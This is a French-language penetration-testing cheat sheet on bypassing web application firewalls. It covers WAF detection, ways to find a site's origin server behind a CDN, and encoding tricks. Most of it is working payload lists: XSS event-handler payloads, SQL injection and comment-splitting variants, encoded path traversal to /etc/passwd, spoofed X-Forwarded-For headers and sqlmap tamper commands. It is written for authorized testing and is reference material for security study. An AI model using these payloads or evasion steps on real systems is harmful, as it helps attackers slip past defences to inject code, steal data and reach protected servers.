# 🛡️ Fiche pratique de contournement des WAF

<!-- language-home-navigation -->
[🏠 Accueil en français](../../README.fr.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe Sürüm](README.tr.md) • [🇬🇷 Ελληνικά](README.el.md)

```
  ██╗    ██╗ █████╗ ███████╗    ██████╗ ██╗   ██╗██████╗  █████╗ ███████╗███████╗
  ██║    ██║██╔══██╗██╔════╝    ██╔══██╗╚██╗ ██╔╝██╔══██╗██╔══██╗██╔════╝██╔════╝
  ██║ █╗ ██║███████║█████╗      ██████╔╝ ╚████╔╝ ██████╔╝███████║███████╗███████╗
  ██║███╗██║██╔══██║██╔══╝      ██╔══██╗  ╚██╔╝  ██╔═══╝ ██╔══██║╚════██║╚════██║
  ╚███╔███╔╝██║  ██║██║         ██████╔╝   ██║   ██║     ██║  ██║███████║███████║
   ╚══╝╚══╝ ╚═╝  ╚═╝╚═╝         ╚═════╝    ╚═╝   ╚═╝     ╚═╝  ╚═╝╚══════╝╚══════╝
   Web Application Firewall Bypass
```

> **Précisions de lecture :** les variantes dépendent du WAF, du parseur, du navigateur, du SGBD et du contexte d’insertion. Elles ne garantissent pas un contournement ; couper un mot-clé SQL par un commentaire peut aussi rendre la requête invalide. Les méthodes HTTP et en-têtes ne sont interprétés que si le serveur ou les intermédiaires les prennent en charge. Les fragments ne sont pas tous des requêtes HTTP complètes.
>
> **Exemples historiques :** les formes `%C0...` présentées comme UTF-8 utilisent des séquences surlongues, interdites par la [RFC 3629](https://www.rfc-editor.org/rfc/rfc3629.html#section-3). Elles restent présentes pour fidélité, comme les variantes d’octets nuls et d’anciens éléments HTML. Le calcul MD5 du favicon et le calcul MMH3 de la ligne suivante produisent des empreintes différentes ; il faut respecter le format attendu par le service de recherche.
>
> **Recherche d’origine :** une ancienne IP, un certificat, une adresse de messagerie ou l’absence d’appartenance à une plage cloud constitue une piste, pas une preuve du serveur d’origine actuel. Une adresse IPv6 n’implique pas l’absence de protection. Les syntaxes des outils et champs de recherche peuvent évoluer. Les commandes, payloads et le texte du dessin ASCII restent ceux du document source.

---

## 🎯 Qu’est-ce que le contournement d’un WAF

Les techniques de **contournement des WAF** (Web Application Firewalls, pare-feu applicatifs web) cherchent à éviter leurs contrôles pour atteindre le serveur d’origine ou transmettre des charges utiles (payloads) lors d’un test d’intrusion.

### WAF courants
- Cloudflare
- AWS WAF
- Akamai
- Imperva/Incapsula
- ModSecurity
- F5 BIG-IP
- Fortinet FortiWeb
- Sucuri

---

## 🔍 Détection d’un WAF

### wafw00f
```bash
# Détecter le WAF
wafw00f https://target.com

# Sortie détaillée
wafw00f https://target.com -v

# Tester toutes les signatures WAF
wafw00f https://target.com -a
```

### Détection manuelle
```bash
# Examiner les en-têtes de réponse
curl -I https://target.com

# Rechercher :
# - Server: cloudflare
# - X-Sucuri-ID
# - X-CDN: Incapsula
# - cf-ray (Cloudflare)
```

---

## 🌐 Recherche de l’adresse IP d’origine

### Historique DNS
```bash
# Services à consulter :
# - SecurityTrails.com
# - ViewDNS.info/iphistory
# - DNSHistory.org
# - CompleteDNS.com

# API SecurityTrails
curl "https://api.securitytrails.com/v1/history/target.com/dns/a" \
  -H "APIKEY: YOUR_KEY"
```

### Recherche de certificats SSL
```bash
# Rechercher des certificats dans Censys.io
# Rechercher target.com dans le certificat

# crt.sh — journaux de transparence des certificats
curl "https://crt.sh/?q=target.com&output=json" | jq

# Interface en ligne de commande Censys
censys search "parsed.names: target.com"
```

### Shodan/Censys
```bash
# Shodan
shodan search "ssl:target.com"
shodan search "hostname:target.com"

# Shodan — rechercher par empreinte de certificat SSL
shodan search "ssl.cert.fingerprint:XXXX"

# Censys
# Recherche : services.tls.certificates.leaf_data.subject.common_name: target.com
```

### En-têtes de courriel
```bash
# S’abonner à une lettre d’information ou à des notifications
# Examiner les en-têtes de courriel à la recherche de l’IP d’origine

# Rechercher :
# Received: from [ORIGIN_IP]
# X-Originating-IP: [ORIGIN_IP]
```

### Sous-domaines sans CDN
```bash
# Rechercher les sous-domaines
subfinder -d target.com -o subs.txt

# Examiner les adresses pour repérer les services derrière un CDN
cat subs.txt | httpx -ip

# Rechercher :
# - mail.target.com
# - ftp.target.com
# - dev.target.com
# - staging.target.com
# - api-internal.target.com
# - vpn.target.com
```

### Empreinte du favicon
```bash
# Calculer une empreinte du favicon
curl -s https://target.com/favicon.ico | md5sum

# Calculer l’empreinte de favicon utilisée dans l’exemple de recherche Shodan
python3 -c "import mmh3,requests,codecs; print(mmh3.hash(codecs.encode(requests.get('https://target.com/favicon.ico').content,'base64')))"

# Recherche Shodan
shodan search "http.favicon.hash:HASH_VALUE"
```

### Accès par IPv6
```bash
# Le WAF peut ne pas couvrir l’accès IPv6
dig AAAA target.com
curl -g "http://[IPv6_ADDRESS]/" -H "Host: target.com"
```

### Plages d’adresses cloud
```bash
# Consulter les plages IP des fournisseurs cloud
# AWS: https://ip-ranges.amazonaws.com/ip-ranges.json
# Azure: https://www.microsoft.com/en-us/download/details.aspx?id=56519
# GCP: https://www.gstatic.com/ipranges/cloud.json

# Une IP hors des plages consultées peut être une piste, pas une preuve d’origine
```

---

## 🔓 Encodage des charges utiles

### Encodage d’URL
```
# Encodage simple
<script> → %3Cscript%3E

# Double encodage
<script> → %253Cscript%253E

# Encodage mixte
<script> → %3Cscr%69pt%3E
```

### Encodage Unicode
```
# UTF-8
<script> → %C0%BC%73%63%72%69%70%74%C0%BE

# Séquences d’échappement Unicode
<script> → \u003cscript\u003e

# Entités HTML
<script> → &#60;script&#62;
<script> → &#x3c;script&#x3e;
```

### Modification de la casse
```
<script> → <ScRiPt>
<script> → <SCRIPT>
SELECT → SeLeCt
UNION → UnIoN
```

### Octets nuls
```
# Injection d’un octet nul
<scri%00pt>
<script%00>alert(1)</script>
SEL%00ECT
```

### Commentaires
```sql
# Commentaires SQL
SEL/**/ECT
UNION/**/SELECT
UN/**/ION/**/SE/**/LECT

# Commentaires intégrés
SELECT/*comment*/FROM
1'/**/OR/**/1=1--
```

### Autres caractères d’espacement
```sql
# Tabulation, saut de ligne, retour chariot
SELECT%09FROM
SELECT%0AFROM
SELECT%0DFROM

# Signe plus
UNION+SELECT
1'+OR+1=1--
```

---

## 🔥 Variantes de contournement des WAF

### Variantes XSS
```html
# Forme classique présentée comme bloquée
<script>alert(1)</script>

# Variantes de contournement
<svg onload=alert(1)>
<img src=x onerror=alert(1)>
<body onload=alert(1)>
<input onfocus=alert(1) autofocus>
<marquee onstart=alert(1)>
<video src=x onerror=alert(1)>
<audio src=x onerror=alert(1)>
<details open ontoggle=alert(1)>
<math><mtext><table><mglyph><style><img src=x onerror=alert(1)>

# Sans parenthèses
<img src=x onerror=alert`1`>
<img src=x onerror=alert&lpar;1&rpar;>

# Sans alert
<img src=x onerror=confirm(1)>
<img src=x onerror=prompt(1)>
<img src=x onerror=eval('ale'+'rt(1)')>
```

### Variantes d’injection SQL
```sql
# Variantes de UNION
UNION SELECT → UNION ALL SELECT
UNION SELECT → /*!50000UNION*/ SELECT
UNION SELECT → %55nion %53elect
UNION SELECT → uNioN sEleCt

# Variantes de commentaires
-- → #
-- → --+
-- → --%00
-- → /**/

# Variantes logiques
OR 1=1 → OR 2=2
OR 1=1 → OR 'a'='a'
OR 1=1 → || 1=1
AND 1=1 → && 1=1

# Commentaires conditionnels selon la version (MySQL)
/*!50000SELECT*/ → Exécuté uniquement si MySQL >= 5.0
```

### Variantes de traversée de répertoires
```
../../../etc/passwd
..%2F..%2F..%2Fetc/passwd
..%252F..%252F..%252Fetc/passwd
....//....//....//etc/passwd
..%c0%af..%c0%af..%c0%afetc/passwd
%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd
```

---

## 🛠️ Techniques HTTP

### Pollution des paramètres HTTP (HPP)
```http
# Paramètres répétés
?id=1&id=2
?id=1&ID=2

# Injection de tableaux
?id[]=1&id[]=2
?id=1&id=2&id=3
```

### Modification de la méthode HTTP
```bash
# Modifier la méthode
curl -X POST → curl -X PUT
curl -X GET → curl -X TRACE

# En-têtes de remplacement de méthode
X-HTTP-Method-Override: PUT
X-Method-Override: DELETE
X-HTTP-Method: PATCH
```

### Modification des en-têtes
```http
# En-têtes indiquant une adresse IP supposée
X-Forwarded-For: 127.0.0.1
X-Real-IP: 127.0.0.1
X-Originating-IP: 127.0.0.1
X-Client-IP: 127.0.0.1
CF-Connecting-IP: 127.0.0.1
True-Client-IP: 127.0.0.1

# Confusion de type de contenu
Content-Type: application/json
Content-Type: text/plain
Content-Type: application/xml
```

### Encodage par blocs (chunked)
```http
Transfer-Encoding: chunked

4
test
0
```

---

## 🛠️ Outils

| Outil | Utilité |
|------|---------|
| **wafw00f** | Détection de WAF |
| **CloudFlair** | Recherche du serveur d’origine derrière Cloudflare |
| **Bypass-Firewalls-by-DNS-History** | Recherche dans l’historique DNS |
| **WhatWaf** | Détection de WAF et recherche de contournements |
| **sqlmap --tamper** | Scripts de transformation pour les injections SQL |

### Scripts de transformation (tamper) de sqlmap
```bash
# Utiliser des scripts de transformation
sqlmap -u "http://target.com/id=1" --tamper=space2comment
sqlmap -u "http://target.com/id=1" --tamper=randomcase
sqlmap -u "http://target.com/id=1" --tamper=between

# Combiner plusieurs scripts de transformation
sqlmap -u "http://target.com/id=1" --tamper=space2comment,randomcase
```

---

## 📊 Référence rapide

| Technique | Cas d’usage |
|-----------|----------|
| Historique DNS | Rechercher l’adresse IP d’origine |
| Recherche SSL | Recherche de certificats dans Censys/Shodan |
| Énumération des sous-domaines | Rechercher les sous-domaines sans CDN |
| Encodage | Tester les limites des filtres |
| Variation de casse | Tester les règles simples |
| Commentaires | Intercaler des commentaires dans les mots-clés selon le contexte |

---

## 📚 Ressources

- [PayloadsAllTheThings WAF](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/WAF%20Bypass)
- [HackTricks WAF](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/waf-bypass)
- [OWASP WAF Bypass](https://owasp.org/www-community/attacks/Bypass_Web_Application_Firewall)

---

<p align="center">
  <b>🛡️ Contournez les WAF !</b><br>
  <i>Uniquement dans le cadre de tests autorisés !</i>
</p>
